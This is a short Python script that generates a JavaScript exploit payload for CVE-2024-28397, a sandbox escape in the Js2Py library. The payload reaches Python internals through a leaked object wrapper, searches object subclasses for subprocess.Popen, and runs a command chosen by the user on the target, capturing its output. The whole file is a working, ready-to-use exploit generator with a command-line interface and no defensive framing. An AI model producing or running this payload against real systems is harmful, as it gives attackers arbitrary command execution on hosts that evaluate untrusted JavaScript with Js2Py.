import argparse
import sys

def generate_payload(command: str) -> str:
    """
    Generates the JavaScript payload to escape the sandbox and execute the command.
    
    Args:
        command (str): The system command to execute.
        
    Returns:
        str: The malicious JavaScript payload.
    """
    # Escape double quotes to prevent syntax errors in the JS string
    safe_command = command.replace('"', '\\"')
    
    # The payload uses a recursive search to find subprocess.Popen starting from a leaked
    # Python object wrapper.
    payload = """
    var output = "Initial";
    try {
        // 1. Obtain a PyObjectWrapper via Object.getOwnPropertyNames({})
        // On Python 3, this returns a wrapped dict_keys object, exposing python internals.
        var leaked_wrapper = Object.getOwnPropertyNames({});
        
        // 2. Access the python 'object' class via __class__.__base__
        var object_class = leaked_wrapper.__getattribute__("__class__").__base__;
        
        // 3. Define a recursive function to find subprocess.Popen
        function find_popen(cls) {
            var subs = cls.__subclasses__();
            for (var i = 0; i < subs.length; i++) {
                var item = subs[i];
                try {
                    if (item.__module__ == "subprocess" && item.__name__ == "Popen") {
                        return item;
                    }
                } catch (e) {
                    // Ignore access violations during traversal
                }
                
                // Recursively search, avoiding 'type' to prevent infinite recursion
                if (item.__name__ != "type") {
                    try {
                        var result = find_popen(item);
                        if (result) return result;
                    } catch (e) {}
                }
            }
            return null;
        }
        
        // 4. Find Popen
        var Popen = find_popen(object_class);
        
        if (Popen) {
            // 5. Execute the command using Popen.communicate() to capture stdout/stderr
            var res = Popen("COMMAND_PLACEHOLDER", -1, null, -1, -1, -1, null, null, true).communicate();
            output = res;
        } else {
            output = "Error: Could not find subprocess.Popen";
        }
    } catch (e) {
        output = "Error during exploit execution: " + e;
    }
    output
    """
    return payload.replace("COMMAND_PLACEHOLDER", safe_command)

def main() -> None:
    parser = argparse.ArgumentParser(
        description="Payload Generator for CVE-2024-28397 (Js2Py Sandbox Escape)",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument("-c", "--command", help="Command to execute on the target (default: id)", default="id")
    
    args = parser.parse_args()
    
    # Generate and print only the payload code
    payload = generate_payload(args.command)
    print(payload)

if __name__ == "__main__":
    main()
